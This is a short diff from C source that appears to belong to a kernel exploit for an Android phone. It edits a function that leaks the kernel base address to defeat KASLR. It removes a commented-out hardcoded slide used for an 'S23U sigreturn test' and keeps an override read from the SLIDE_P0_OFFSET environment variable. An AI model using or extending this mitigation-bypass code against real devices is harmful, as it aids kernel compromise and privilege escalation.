@@ -135,17 +135,6 @@ static int slide_tracefs_leak_kernel_base(void) {
 }
 
 int slide_leak_kernel_base(void) {
-      /* HARDCODED BYPASS FOR S23U SIGRETURN TEST 
-    slide_p0_offset = 0x80000;   // ← KASLR slide = 0x80000//0x2c05080;
-    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
-    kaslr_slide = slide_p0_offset;
-    kaslr_done = 1;
-    
-    pr_success("slide-kaslr-ok source=hardcoded pid=%d base=%016llx slide=%016llx\n",
-               getpid(), (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    return 1;
-*/
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   if (forced_offset_arg && *forced_offset_arg) {
     char *end = NULL;
